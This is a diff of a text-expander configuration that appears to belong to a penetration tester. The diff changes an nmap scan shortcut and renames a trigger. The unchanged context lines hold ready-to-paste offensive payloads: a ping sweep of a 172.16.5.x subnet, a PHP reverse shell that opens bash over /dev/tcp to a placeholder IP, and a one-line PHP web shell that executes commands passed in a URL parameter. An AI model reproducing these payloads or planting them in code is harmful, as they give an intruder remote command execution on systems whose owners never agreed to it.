@@ -75,7 +75,7 @@ matches:
 
 # ENUMERATION
   - trigger: ":nmap"
-    replace: sudo nmap -sC -sV -v -p- -o nmap --min-rate 
+    replace: sudo nmap -A -sC -sV -v -o nmap -T4 
 
   - trigger: ":lping"
     replace: for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
@@ -93,7 +93,7 @@ matches:
 
   - trigger: ":rphp"
     replace: <?php shell_exec("bash -c 'bash -i >& /dev/tcp/{{IP}}/22 0>&1'"); ?>
-  - trigger: ":wphp"
+  - trigger: ":webphp"
     replace: <?php echo shell_exec($_GET['cmd']); ?>
     
   - trigger: ":rcurl"                                                           
